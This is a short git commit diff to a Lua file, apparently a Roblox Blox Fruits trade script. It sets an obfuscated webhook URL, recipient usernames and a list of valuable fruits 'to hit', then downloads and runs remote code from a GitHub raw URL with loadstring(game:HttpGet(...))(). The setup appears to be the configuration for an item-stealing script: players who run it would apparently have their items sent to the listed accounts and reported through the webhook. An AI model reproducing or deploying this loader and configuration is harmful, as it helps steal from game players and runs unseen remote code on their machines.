3a0d0e1541346ae51092fb6f0658d45d9b381c68
seregapirat577 <kasenkomaks058@gmail.com>
2025-03-29 19:45:07 +0200

    Update trade.lua

--- trade.lua
+++ trade.lua
@@ -1,5 +1,5 @@
 Webhook = "https://webhook-protect.vercel.app/api/webhook?id=elBUcWpYYWlzWnJHUlMyVm01aUxHZzpzWm12U09pUHAxTFI5OGNnbFB5YVJpQlhibjAwcUdaeXJCZzNFR002eHBtTGFEemM5WmZDZG9adWVvLWhGWlNzRWdWQUNHS3hmVGhJZVc1ZlIyaEh2dGRERlFBS0J2YTZ2b25IZTl5N2JnQVd1UkxKRUtGa3dxbHRVNDNtRHdvZkVDSDRkZDQxdWJDbGJ1cW14VHl5R0kwaGl1T2pyZGZueEFiaDhiaFZ6MTg" -- << Your Webhook
 Usernames = {"Krovosisa228siska28", "BERSERK"} -- << Your username(-s).
-FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "Dragon-Dragon", "Spirit-Spirit"} -- << Fruits you want
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Dough-Dough", "Dragon-Dragon"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
